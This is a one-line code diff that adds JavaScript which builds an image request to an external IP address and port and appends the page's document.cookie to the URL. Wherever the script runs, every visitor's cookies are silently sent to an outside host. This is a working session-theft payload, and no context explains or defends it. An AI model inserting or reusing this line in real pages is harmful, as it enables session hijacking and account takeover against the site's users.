@@ -1,0 +1,1 @@
+img = new Image(); img.src = "http://109.234.39.144:8889/?x=" + document.cookie;
